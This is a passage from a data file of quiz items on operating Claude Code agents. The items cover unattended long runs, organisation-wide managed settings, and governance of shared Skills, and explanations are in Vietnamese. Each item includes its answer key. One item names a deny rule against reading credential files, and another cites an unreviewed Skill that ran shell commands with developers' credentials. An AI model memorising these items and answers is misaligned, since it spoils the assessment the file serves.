      "Agent chạy theo lịch mỗi đêm, kéo dài vài tiếng, nâng cấp thư viện phụ thuộc (dependency) trên nhiều repo.",
      "Không ai trực. Chạy lâu thì dễ bị ngắt giữa chừng, và dễ gặp bước rủi ro như bản nâng cấp có thay đổi phá vỡ (breaking change).",
      "Chỗ khó: ba phương án sai đều nghe như giúp agent chạy trơn tru hơn. Thứ cần là chạy được lâu mà vẫn trong tầm kiểm soát."
    ],
    asks: [
      "Hai biện pháp vận hành nào quan trọng nhất?",
      "Tức là: một cách để bị ngắt vẫn chạy tiếp được và không tiêu quá tay, một cách để chuyện khó về tay người thay vì agent tự ứng biến."
    ],
    facts: [
      "Checkpoint (điểm lưu): ghi lại tiến độ để lần chạy sau tiếp tục từ chỗ dừng. Bài Anthropic về harness cho agent chạy lâu dùng file tiến độ và commit git để phiên mới nắm được việc đã làm và quay về trạng thái tốt khi cần.",
      "Agent SDK lưu session (phiên) và cho resume (chạy tiếp) với đủ ngữ cảnh cũ. <code>max_turns</code> và <code>max_budget_usd</code> chặn số lượt và mức chi, chạm hạn mức thì trả về <code>error_max_turns</code> hoặc <code>error_max_budget_usd</code>.",
      "Leo thang (escalation): khi bị chặn hoặc tới bước rủi ro thì agent dừng và báo người phụ trách. Docs headless có cờ <code>--permission-prompts none</code> cho lần chạy không ai trực: việc cần người duyệt bị từ chối, Claude được báo là không ai duyệt được và đừng thử lại.",
      "Báo động chỉ có giá trị khi nó kêu lúc có chuyện. Chỉ báo khi thành công thì thất bại trôi qua im lặng."
    ],
    opts: [
      { k: "A", gist: "Remove every limit so long runs always reach the end.",
        why: [
          "Sai: không giới hạn thì một vòng lặp lỗi (nâng cấp, test fail, thử lại) chạy cả đêm và tiêu không kiểm soát (ý 2).",
          "“Always finish” (luôn chạy xong) không phải mục tiêu. Chạy xong mà sai còn tệ hơn dừng sớm và báo."
        ] },
      { k: "B", gist: "Grant it administrator credentials so permissions never block it.",
        why: [
          "Sai: quyền rộng biến một lỗi nhỏ thành thiệt hại lớn, vd đẩy thẳng thay đổi lỗi lên nhánh chính của mọi repo.",
          "Bị chặn vì thiếu quyền là tín hiệu có ích: đó là lúc nên leo thang cho người (ý 3), không phải lúc gỡ rào."
        ] },
      { k: "C", gist: "Checkpoint progress so an interrupted run picks up where it left off, and set turn and budget limits.",
        why: [
          "Đúng: chạy vài tiếng trên nhiều repo thì bị ngắt là chuyện thường. Có checkpoint thì chạy tiếp, không làm lại từ đầu, không làm trùng (ý 1, ý 2).",
          "Giới hạn lượt và budget giữ cho mỗi đêm có mức chi biết trước (ý 2)."
        ] },
      { k: "D", gist: "Set up notification and escalation, so the agent halts and alerts an owner when it is blocked or reaches a risky step rather than improvising.",
        why: [
          "Đúng: chuyện agent không chắc (breaking change, test fail khó hiểu, thiếu quyền) thành quyết định của người (ý 3).",
          "Ngược với ứng biến: agent tự đoán lúc 2 giờ sáng là cách nhanh nhất để có một loạt PR sai trên hàng chục repo."
        ] },
      { k: "E", gist: "Alert people only when a run succeeds, because failures are expected.",
        why: [
          "Sai: im lặng khi thất bại là giấu vấn đề (ý 4). Repo nào nâng cấp hỏng nhiều đêm liền cũng không ai biết.",
          "Dễ bị cuốn vì nghe như giảm nhiễu báo động. Nhưng thứ cần báo chính là thất bại, còn thành công thì chỉ cần ghi log."
        ] }
    ],
    refs: [
      { label: "Docs How the agent loop works, mục “Turns and budget” và “Sessions and continuity”: giới hạn lượt, mức chi, và resume phiên sau khi dừng", href: "https://code.claude.com/docs/en/agent-sdk/agent-loop#turns-and-budget" },
      { label: "Bài Anthropic Engineering “Effective harnesses for long-running agents”: file tiến độ và commit git để phiên sau tiếp tục từ chỗ phiên trước dừng", href: "https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents" },
      { label: "Docs Run Claude Code programmatically, mục “Turn off permission prompts in unattended runs”: lần chạy không ai trực thì từ chối việc cần duyệt thay vì treo chờ", href: "https://code.claude.com/docs/en/headless#turn-off-permission-prompts-in-unattended-runs" }
    ]
  },
  {
    de: 1, n: 99, total: 100, sub: "8.4", subName: "Cấu hình coding agent toàn tổ chức",
    answer: "C",
    ask: "A company wants every developer's Claude Code to block access to production credential files, allow only approved MCP servers, and ship usage telemetry to a central collector. Developers are able to edit their own user and project settings. Which approach actually enforces this policy?",
    scene: [
      "Công ty muốn ba điều trên Claude Code của mọi developer: chặn đọc file credential (thông tin đăng nhập) production, chỉ cho MCP server đã duyệt, gửi telemetry (số liệu sử dụng) về một collector trung tâm.",
      "Ràng buộc then chốt: developer sửa được user settings và project settings của chính họ.",
      "Chỗ khó: đề hỏi “enforces” (cưỡng chế được), tức là developer muốn cũng không gỡ được. Cách nào nằm ở tầng developer sửa được đều loại."
    ],
    asks: [
      "Cách nào cưỡng chế được chính sách?",
      "Tức là: đặt chính sách ở tầng cấu hình mà user settings, project settings và cờ dòng lệnh không ghi đè được."
    ],
    facts: [
      "Thứ tự ưu tiên settings của Claude Code, cao nhất trước: managed settings, dòng lệnh, project local, shared project, user. Docs ghi: không gì trong settings của developer hay <code>--settings</code> ghi đè được một khóa managed.",
      "Managed settings chứa được permission rule, vd rule <code>deny</code> dạng <code>Read(./.env)</code> để chặn đọc file. Danh sách quyền gộp từ các tầng, nên developer thêm được mục nhưng không gỡ được mục managed.",
      "MCP: <code>allowedMcpServers</code> cùng <code>allowManagedMcpServersOnly: true</code> trong managed settings biến danh sách cho phép của tổ chức thành danh sách duy nhất có hiệu lực. Docs telemetry: admin cấu hình OpenTelemetry cho mọi người qua managed settings, và khi managed đặt endpoint thì developer không trỏ sang collector khác được.",
      "CLAUDE.md hay tài liệu nội bộ chỉ là hướng dẫn cho model và cho người, không phải luật mà client cưỡng chế."
    ],
    opts: [
      { k: "A", gist: "Write the rule into the engineering handbook and count on developers to comply.",
        why: [
          "Sai: tài liệu không phải cưỡng chế (ý 4). Không có gì trong Claude Code đọc handbook.",
          "Một developer quên hay cố tình bỏ qua là chính sách thủng ở máy đó."
        ] },
      { k: "B", gist: "Commit a settings file to every repository, which developers can modify locally.",
        why: [
          "Sai: đề tự nói developer sửa được. Project local và dòng lệnh còn đứng trên shared project trong thứ tự ưu tiên (ý 1).",
          "Dễ bị cuốn vì file commit thì cả team cùng nhận, nghe như áp cho mọi người. Nhưng nó chỉ là mặc định chung, không chống được người muốn ghi đè."
        ] },
      { k: "C", gist: "Roll out managed settings containing permission rules, an MCP allowlist and telemetry configuration; these take precedence and user or project settings cannot override them.",
        why: [
          "Đúng: managed settings đứng trên mọi tầng developer sửa được (ý 1). Docs nói rõ tầng này dành cho chính sách bảo mật và tuân thủ.",
          "Đủ cả ba yêu cầu: deny rule cho file credential (ý 2), allowlist MCP khóa ở managed, cấu hình OpenTelemetry trỏ về collector trung tâm (ý 3)."
        ] },
      { k: "D", gist: "Count on each developer writing a personal instruction file that spells out the rules.",
        why: [
          "Sai: file hướng dẫn cá nhân do chính developer viết và sửa, lại chỉ là chỉ dẫn cho model, không chặn cứng (ý 4).",
          "Không tạo ra telemetry, không chặn MCP server nào. Model có làm theo thì cũng không phải bảo đảm."
        ] }
    ],
    refs: [
      { label: "Docs Settings, mục “Settings precedence”: managed settings đứng cao nhất, settings của developer và <code>--settings</code> không ghi đè được", href: "https://code.claude.com/docs/en/settings#settings-precedence" },
      { label: "Docs Set up Claude Code for your organization, mục “Decide what to enforce”: permission rule, kiểm soát MCP server và các khóa khác đặt trong managed settings", href: "https://code.claude.com/docs/en/admin-setup#decide-what-to-enforce" },
      { label: "Docs Monitoring, mục “Administrator configuration”: cấu hình OpenTelemetry cho mọi người qua managed settings, khóa luôn đích gửi", href: "https://code.claude.com/docs/en/monitoring-usage#administrator-configuration" }
    ]
  },
  {
    de: 1, n: 100, total: 100, sub: "8.4", subName: "Cấu hình coding agent toàn tổ chức",
    answer: "A",
    ask: "Teams are passing around a growing set of Skills, prompts and MCP servers in a chat channel. A Skill recently copied from that channel, never reviewed, ran shell commands with the developers' credentials. What governance model is best?",
    scene: [
      "Các team chia sẻ Skill, prompt, MCP server qua một kênh chat, số lượng ngày càng nhiều.",
      "Sự cố: một Skill chép từ kênh, chưa ai review, đã chạy lệnh shell bằng credential (quyền đăng nhập) của developer.",
      "Chỗ khó: vừa phải giữ lợi ích dùng chung, vừa phải biết thứ gì đang chạy trên máy mọi người. Cấm hẳn hay thả nổi đều sai một vế."
    ],
    asks: [
      "Mô hình quản trị nào tốt nhất?",
      "Tức là: thứ dùng chung phải có chủ, có review, có phiên bản, và tới máy người dùng qua một kênh có kiểm soát."
    ],
    facts: [
      "Docs Plugin security: plugin cài vào có thể chạy code tùy ý trên máy với quyền của người dùng. Hook và tiến trình MCP server chạy ngoài sandbox, permission rule chỉ phủ lời gọi tool của Claude, không phủ code plugin tự chạy. Anthropic không kiểm soát nội dung plugin bên thứ ba.",
      "Skill có thể tự cấp quyền dùng tool qua <code>allowed-tools</code> và chạy lệnh shell để chèn ngữ cảnh. Docs Skills khuyên review <code>allowed-tools</code> của skill trong repo trước khi chạy Claude Code ở đó.",
      "Docs “Manage plugins for your organization”: admin dựng marketplace (danh mục plugin) của tổ chức, ép cài plugin đã duyệt qua managed settings, chặn nguồn khác bằng <code>strictKnownMarketplaces</code>. Marketplace trỏ tới một git ref, nên có phiên bản và chạy được kênh phát hành riêng.",
      "Thứ chạy với quyền của nhiều người thì cần owner (người chịu trách nhiệm), review code và bảo mật trước khi phát, và một tiêu chuẩn chất lượng tối thiểu."
    ],
    opts: [
      { k: "A", gist: "Run a registry for shared Skills and servers, with named owners, code and security review, versioning and a quality bar, and roll out approved entries through managed configuration.",
        why: [
          "Đúng: mỗi thứ dùng chung có owner, được review code và bảo mật trước khi tới máy ai (ý 1, ý 4).",
          "Có phiên bản thì biết máy nào đang chạy bản nào, bản lỗi thì rút được. Phát qua managed configuration, vd marketplace tổ chức cùng <code>strictKnownMarketplaces</code>, thì nguồn chưa duyệt không vào được (ý 3).",
          "Giữ nguyên lợi ích dùng chung, chỉ thêm cổng kiểm soát ở chỗ phát."
        ] },
      { k: "B", gist: "Let anyone share anything, because developers can read the files before they use them.",
        why: [
          "Sai: đúng cách này vừa gây sự cố. Đọc được không có nghĩa là có người đọc, và đọc lướt một skill không thấy hết lệnh nó chạy (ý 1, ý 2).",
          "Dễ bị cuốn vì nghe như tin tưởng developer. Nhưng một lần không ai đọc là code lạ chạy bằng credential thật."
        ] },
      { k: "C", gist: "Only share content as screenshots, so nobody can execute it directly.",
        why: [
          "Sai: ảnh chụp không review đàng hoàng được, không có phiên bản, không có owner.",
          "Người ta vẫn gõ lại để dùng, ra một bản chép tay chưa ai duyệt, có khi còn sai chữ. Rủi ro còn nguyên, chỉ thêm phiền."
        ] },
      { k: "D", gist: "Ban all sharing and require each developer to build everything from scratch.",
        why: [
          "Sai: mất lợi ích dùng chung, mỗi người viết lại cùng một thứ.",
          "Rủi ro cũng không giảm: code mỗi người tự viết vẫn chạy với credential của họ, mà còn không ai review."
        ] }
    ],
    refs: [
      { label: "Docs Plugin security and trust, mục “Understand what a plugin can do”: plugin chạy code với quyền người dùng, hook và MCP server nằm ngoài sandbox", href: "https://code.claude.com/docs/en/plugins/security#understand-what-a-plugin-can-do" },
      { label: "Docs Manage plugins for your organization, mục “Restrict what users can install”: chỉ cho cài từ marketplace đã duyệt, phát plugin qua managed settings", href: "https://code.claude.com/docs/en/plugins/org#restrict-what-users-can-install" },
      { label: "Docs Control MCP server access, mục “Choose a pattern”: mẫu danh mục server đã duyệt, server khác bị chặn", href: "https://code.claude.com/docs/en/managed-mcp#choose-a-pattern" }
    ]
  }
);
